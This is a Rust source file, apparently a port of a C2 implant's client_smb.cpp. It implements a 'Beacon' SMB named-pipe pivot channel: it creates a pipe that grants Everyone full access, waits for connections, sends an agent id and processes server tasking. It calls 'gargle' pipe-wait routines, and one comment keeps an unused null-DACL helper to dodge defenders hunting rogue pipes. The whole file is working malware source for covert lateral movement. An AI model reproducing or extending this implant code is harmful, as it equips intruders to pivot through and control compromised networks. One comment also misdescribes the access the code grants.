//! client_smb.cpp 的移植版 —— 管理 Beacon 的 SMB 数据通道。
//! Port of client_smb.cpp — Manage the SMB data channel for Beacon.
//!
//! 入口点：
//! 1. `command_link_wait` —— 用户请求 SMB 数据通道
//! 2. `smb_init` —— 创建带 null ACL 的命名管道
//! 3. `smb_wait` —— 等待连接……连接到来时发送 agent id
//! 4. `client_process` —— 处理服务器数据……做正常的 beacon 事务。
//! Entry point:
//! 1. `command_link_wait` — user requested SMB data channel
//! 2. `smb_init` — create our named pipe with a null ACL
//! 3. `smb_wait` — wait for a connection... send agent id when it comes
//! 4. `client_process` — process server data please... do normal beacon stuff.
//!
//! 命名管道使用一个授予 Everyone 完全访问权限的安全描述符创建
//! （DACL 由 advapi32 的 ACL API 构建）。
//! The named pipe is created with a security descriptor that grants Everyone
//! full access (the DACL is built with the advapi32 ACL APIs).

use crate::beacon::SETTING_PIPENAME;
use crate::callback::post_error_d;
use crate::client::{client_init, client_process, client_stop, MAX_GET};
use crate::link::{lchannel_smb, LChannel};
use crate::settings::setting_ptr;
use crate::state;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, LocalFree, ERROR_PIPE_CONNECTED, HANDLE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Security::{
    AllocateAndInitializeSid, FreeSid, InitializeSecurityDescriptor, SetSecurityDescriptorDacl,
    ACL, NO_INHERITANCE, PSECURITY_DESCRIPTOR, PSID, SECURITY_ATTRIBUTES,
    SECURITY_WORLD_SID_AUTHORITY,
};
use windows_sys::Win32::Storage::FileSystem::{
    FlushFileBuffers, PIPE_ACCESS_DUPLEX, SPECIFIC_RIGHTS_ALL, STANDARD_RIGHTS_ALL,
};
use windows_sys::Win32::System::Memory::{LocalAlloc, LPTR};
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe, PIPE_READMODE_MESSAGE,
    PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES,
};
use windows_sys::Win32::System::SystemServices::{
    SECURITY_DESCRIPTOR_REVISION, SECURITY_WORLD_RID,
};

/// 我们的命名管道句柄（client_smb.cpp 的 `static HANDLE pipe`）。
/// Our named pipe handle (client_smb.cpp `static HANDLE pipe`).
static PIPE: Mutex<isize> = Mutex::new(0);

// ---------------------------------------------------------------------------
// 本 crate 未启用 `Win32_Security_Authorization` Cargo 特性，因此
// EXPLICIT_ACCESS/TRUSTEE 类型和 SetEntriesInAcl 在本地声明。
// 下面的定义与 windows-sys 绑定完全一致。
// The `Win32_Security_Authorization` Cargo feature is not enabled in this
// crate, so the EXPLICIT_ACCESS/TRUSTEE types and SetEntriesInAcl are declared
// locally. The definitions below mirror the windows-sys bindings exactly.
// ---------------------------------------------------------------------------

/// 来自 Windows SDK 的 SECURITY_DESCRIPTOR_MIN_LENGTH（windows-sys 中没有）。
/// SECURITY_DESCRIPTOR_MIN_LENGTH from the Windows SDK (not in windows-sys).
const SECURITY_DESCRIPTOR_MIN_LENGTH: usize = 20;

#[allow(non_camel_case_types)]
type ACCESS_MODE = i32;
#[allow(non_camel_case_types)]
type TRUSTEE_FORM = i32;
#[allow(non_camel_case_types)]
type TRUSTEE_TYPE = i32;
#[allow(non_camel_case_types)]
type MULTIPLE_TRUSTEE_OPERATION = i32;

const SET_ACCESS: ACCESS_MODE = 2;
const TRUSTEE_IS_SID: TRUSTEE_FORM = 0;
const TRUSTEE_IS_WELL_KNOWN_GROUP: TRUSTEE_TYPE = 5;

#[repr(C)]
#[derive(Clone, Copy)]
struct TRUSTEE_A {
    p_multiple_trustee: *mut TRUSTEE_A,
    multiple_trustee_operation: MULTIPLE_TRUSTEE_OPERATION,
    trustee_form: TRUSTEE_FORM,
    trustee_type: TRUSTEE_TYPE,
    ptstr_name: *mut u8,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct EXPLICIT_ACCESS_A {
    grf_access_permissions: u32,
    grf_access_mode: ACCESS_MODE,
    grf_inheritance: u32,
    trustee: TRUSTEE_A,
}

#[link(name = "advapi32")]
unsafe extern "system" {
    fn SetEntriesInAclA(
        ccountofexplicitentries: u32,
        plistofexplicitentries: *const EXPLICIT_ACCESS_A,
        oldacl: *const ACL,
        newacl: *mut *mut ACL,
    ) -> u32; // WIN32_ERROR
}

/// 来自 client_smb.cpp 的 `PIPE_PERM_OBJECTS`。
/// `PIPE_PERM_OBJECTS` from client_smb.cpp.
struct PipePermObjects {
    p_everyone_sid: PSID,
    p_acl: *mut ACL,
    p_sd: PSECURITY_DESCRIPTOR,
}

impl PipePermObjects {
    fn nulled() -> Self {
        PipePermObjects {
            p_everyone_sid: std::ptr::null_mut(),
            p_acl: std::ptr::null_mut(),
            p_sd: std::ptr::null_mut(),
        }
    }
}

/* 调用我们的 gargle 函数 / call our gargle function */
unsafe extern "C" fn link_channel_smb_wait(thisp: *mut core::ffi::c_void) {
    let inst = &mut *(thisp as *mut LChannel);
    crate::gargle_pivot_smb::gargle_block_pipe(inst.pipe);
}

/* 创建一种新的通道 / create a new kind of channel */
fn lchannel_smb_gargle(pipe: isize) -> LChannel {
    let mut channel = lchannel_smb(pipe);
    channel.wait = Some(link_channel_smb_wait);
    channel
}

/*
* 等待连接到我们的命名管道
* wait for a connection to our named pipe
*/
fn smb_wait() {
    let pipe = *PIPE.lock();
    if !crate::gargle_pivot_smb::gargle_pipe_wait(pipe) {
        /* 备选方案 / plan B */
        let mut f_connected = 0u32;

        /* 等待连接到我们的管道 / wait for a connection to our pipe */
        while f_connected == 0 {
            let ok = unsafe { ConnectNamedPipe(pipe as HANDLE, std::ptr::null_mut()) };
            f_connected = if ok != 0 {
                1
            } else if unsafe { GetLastError() } == ERROR_PIPE_CONNECTED {
                1
            } else {
                0
            };
        }
    }

    /* 好了，启动我们的客户端初始化例程。 / OK, kick off our client init routine. */
    client_init(lchannel_smb_gargle(pipe));
}

/*
 * 更改管道权限
 * change pipe permissions
 * https://docs.microsoft.com/en-us/windows/win32/secauthz/creating-a-security-descriptor-for-a-new-object-in-c--?redirectedfrom=MSDN
 */
fn setup_pipe_perms(ppo: &mut PipePermObjects, psa: &mut SECURITY_ATTRIBUTES) -> bool {
    let sid_auth_world = SECURITY_WORLD_SID_AUTHORITY;

    // 为 Everyone 组创建一个众所周知的 SID。
    // Create a well-known SID for the Everyone group.
    if unsafe {
        AllocateAndInitializeSid(
            &sid_auth_world,
            1,
            SECURITY_WORLD_RID as u32,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            &mut ppo.p_everyone_sid,
        )
    } == 0
    {
        return false;
    }

    // 为 ACE 初始化一个 EXPLICIT_ACCESS 结构。
    // 该 ACE 将允许 Everyone 对密钥进行读取访问。
    // Initialize an EXPLICIT_ACCESS structure for an ACE.
    // The ACE will allow Everyone read access to the key.
    let mut ea: [EXPLICIT_ACCESS_A; 1] = unsafe { std::mem::zeroed() };
    ea[0].grf_access_permissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ea[0].grf_access_mode = SET_ACCESS;
    ea[0].grf_inheritance = NO_INHERITANCE;
    ea[0].trustee.trustee_form = TRUSTEE_IS_SID;
    ea[0].trustee.trustee_type = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].trustee.ptstr_name = ppo.p_everyone_sid as *mut u8;

    // 创建一个包含新 ACE 的新 ACL。
    // Create a new ACL that contains the new ACEs.
    let dwres = unsafe { SetEntriesInAclA(1, ea.as_ptr(), std::ptr::null(), &mut ppo.p_acl) };
    if dwres != 0
    /* ERROR_SUCCESS */
    {
        return false;
    }

    // 初始化一个安全描述符。
    // Initialize a security descriptor.
    ppo.p_sd = unsafe { LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH) };
    if ppo.p_sd.is_null() {
        return false;
    }

    if unsafe { InitializeSecurityDescriptor(ppo.p_sd, SECURITY_DESCRIPTOR_REVISION) } == 0 {
        return false;
    }

    // 把 ACL 添加到安全描述符中。
    // Add the ACL to the security descriptor.
    if unsafe { SetSecurityDescriptorDacl(ppo.p_sd, 1, ppo.p_acl, 0) } == 0 {
        return false;
    }

    // 初始化一个安全属性结构。
    // Initialize a security attributes structure.
    psa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
    psa.lpSecurityDescriptor = ppo.p_sd;
    psa.bInheritHandle = 0;

    true
}

/* TODO: see how this is called to clean up. done on exit? */
fn cleanup_pipe_perms(ppo: &mut PipePermObjects) {
    if !ppo.p_everyone_sid.is_null() {
        unsafe {
            FreeSid(ppo.p_everyone_sid);
        }
    }
    if !ppo.p_acl.is_null() {
        unsafe {
            LocalFree(ppo.p_acl as *mut core::ffi::c_void);
        }
    }
    if !ppo.p_sd.is_null() {
        unsafe {
            LocalFree(ppo.p_sd);
        }
    }
}

/*
 * 这个函数未被使用，但保留在这里，以防我们决定引入 DACL 灵活性，
 * 当人们开始使用 DACL 来搜索恶意管道时。
 * This function is unused, but is here in case we opt to introduce DACL flexibility
 * when folks start using the DACL to conduct hunts for rogue pipes.
 */
#[allow(dead_code)] // mirrors the C++ unused helper
fn setup_pipe_perms_null(ppo: &mut PipePermObjects, psa: &mut SECURITY_ATTRIBUTES) -> bool {
    /* 把字段和指针置空 / null out the fields and pointers */
    *ppo = PipePermObjects::nulled();

    /* 分配我们的安全描述符结构 / allocate our security descriptor structure */
    ppo.p_sd = unsafe { LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH) };

    /* 把所有东西都设置好 / setup everything up */
    unsafe {
        InitializeSecurityDescriptor(ppo.p_sd, SECURITY_DESCRIPTOR_REVISION);
        SetSecurityDescriptorDacl(ppo.p_sd, 1, std::ptr::null(), 0);
    }
    psa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
    psa.lpSecurityDescriptor = ppo.p_sd;
    psa.bInheritHandle = 0;

    true
}

/*
*  初始化一个命名管道
*  init a named pipe
*/
pub fn smb_init() -> bool {
    let mut ppo = PipePermObjects::nulled();

    /* 空的安全属性——允许任何人连接 / null security attributes -- allows anyone to connect */
    let mut sa: SECURITY_ATTRIBUTES = unsafe { std::mem::zeroed() };

    /* 设置我们的命名管道安全属性 / setup our named pipe security attributes */
    setup_pipe_perms(&mut ppo, &mut sa);

    /* 请设置我们的命名管道 / setup our named pipe please */
    let mut pipename = setting_ptr(SETTING_PIPENAME).unwrap_or(b"").to_vec();
    if !pipename.ends_with(&[0]) {
        pipename.push(0);
    }
    let temps = unsafe {
        CreateNamedPipeA(
            pipename.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
            PIPE_UNLIMITED_INSTANCES,
            MAX_GET as u32,
            MAX_GET as u32,
            0,
            &sa,
        )
    };

    /* 这些指针用完了，所以让我们清理它们 / we're done with these pointers, so let's clean them up */
    cleanup_pipe_perms(&mut ppo);

    /* 检查错误并立即失败…… / check for errors and fail now... */
    if temps == INVALID_HANDLE_VALUE {
        post_error_d(0x17, unsafe { GetLastError() } as i32);
        return false;
    }

    /* 现在把发布类型设为 POST_SMB……因为一切似乎正常
     * set post type to POST_SMB now... since everything seems OK */
    state::set_post_type(crate::commands::POST_SMB);

    /* 现在我们可以分配句柄 / now we can assign the handle */
    *PIPE.lock() = temps as isize;
    true
}

/* 停止所有东西 / stop everything */
fn smb_stop() {
    /* 好了，关闭所有东西！ / OK, shut everything down! */
    unsafe {
        CloseHandle(*PIPE.lock() as HANDLE);
    }

    /* 最后一次清理资源 / clean up the resources with our last go */
    client_stop();
}

/*
* 把这个 beacon 置于等待连接到其管道的模式
* put this beacon into a mode where it's waiting for a connection to its pipe
*/
pub fn command_link_wait() {
    /* 设置我们的 SMB 服务器 / setup our SMB server */
    if !smb_init() {
        return;
    }

    /* 当我们是 SMB 服务器时……做这些事情
     * while we are an SMB server... do this stuff */
    while state::sleep_time() > 0 {
        /* 等待连接并发送我们的 agent id / wait for a connection and send our agent id */
        smb_wait();

        /* 处理数据 / process data */
        client_process();

        /* 关闭会话 / close the session */
        let pipe = *PIPE.lock();
        unsafe {
            FlushFileBuffers(pipe as HANDLE);
            DisconnectNamedPipe(pipe as HANDLE);
        }
    }

    /* 我们不再是 SMB 服务器……停止这些把戏
     * we're no longer an SMB server... stop the shenanigans */
    smb_stop();

    /* 直接终止进程……要么这样要么崩溃 / just kill the process... it's this or crash */
    crate::thread::safe_exit();
}

/// `connect_pipe` 位于 jobs.cpp（移植到 jobs.rs）；重新导出它，使
/// `crate::client_smb::connect_pipe` 能为 SMB 链接调用者解析。
/// `connect_pipe` lives in jobs.cpp (ported to jobs.rs); re-export it so
/// `crate::client_smb::connect_pipe` resolves for SMB link callers.
pub use crate::jobs::connect_pipe;
